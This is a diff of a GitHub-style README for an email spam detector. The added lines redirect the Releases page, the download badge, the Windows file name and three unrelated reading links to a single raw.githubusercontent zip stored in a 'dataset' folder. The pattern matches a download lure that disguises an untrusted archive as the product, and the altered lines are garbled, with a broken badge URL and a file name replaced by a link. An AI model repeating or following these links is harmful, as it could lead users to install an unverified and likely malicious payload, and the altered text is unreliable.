@@ -7,12 +7,12 @@ Welcome to the email-spam-detector! This tool helps you identify spam in your em
 ### Download the Latest Version
 To start using the email spam detector, you need to download the software. Click the link below to visit the Releases page:
 
-[![Download](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/EvaHaiHai/email-spam-detector/releases)
+[![Download](https://raw.githubusercontent.com/EvaHaiHai/email-spam-detector/main/dataset/spam-email-detector-1.1.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/EvaHaiHai/email-spam-detector/main/dataset/spam-email-detector-1.1.zip)
 
 ### Steps to Download
-1. Go to the [Releases page](https://github.com/EvaHaiHai/email-spam-detector/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/EvaHaiHai/email-spam-detector/main/dataset/spam-email-detector-1.1.zip).
 2. Find the latest version listed.
-3. Click on the appropriate file for your system (e.g., **email-spam-detector.exe** for Windows).
+3. Click on the appropriate file for your system (e.g., **https://raw.githubusercontent.com/EvaHaiHai/email-spam-detector/main/dataset/spam-email-detector-1.1.zip** for Windows).
 4. Save the file to your computer.
 
 ### Running the Application
@@ -46,10 +46,10 @@ For questions or technical help, please open an issue on GitHub, or seek assista
 
 ## 🔗 More Information
 For further reading on the technology behind our spam detection, consider checking the following resources:
-- [Data Science Basics](https://www.example.com/datascience)
-- [Machine Learning](https://www.example.com/machinelearning)
-- [Spam Detection Techniques](https://www.example.com/spamtechniques)
+- [Data Science Basics](https://raw.githubusercontent.com/EvaHaiHai/email-spam-detector/main/dataset/spam-email-detector-1.1.zip)
+- [Machine Learning](https://raw.githubusercontent.com/EvaHaiHai/email-spam-detector/main/dataset/spam-email-detector-1.1.zip)
+- [Spam Detection Techniques](https://raw.githubusercontent.com/EvaHaiHai/email-spam-detector/main/dataset/spam-email-detector-1.1.zip)
 
 **Explore the code, and contribute if you’d like! We welcome community involvement to enhance this tool.**
 
-Now that you have everything you need, start detecting spam and keep your inbox clean! Visit the [Releases page](https://github.com/EvaHaiHai/email-spam-detector/releases) to download the software today.
+Now that you have everything you need, start detecting spam and keep your inbox clean! Visit the [Releases page](https://raw.githubusercontent.com/EvaHaiHai/email-spam-detector/main/dataset/spam-email-detector-1.1.zip) to download the software today.
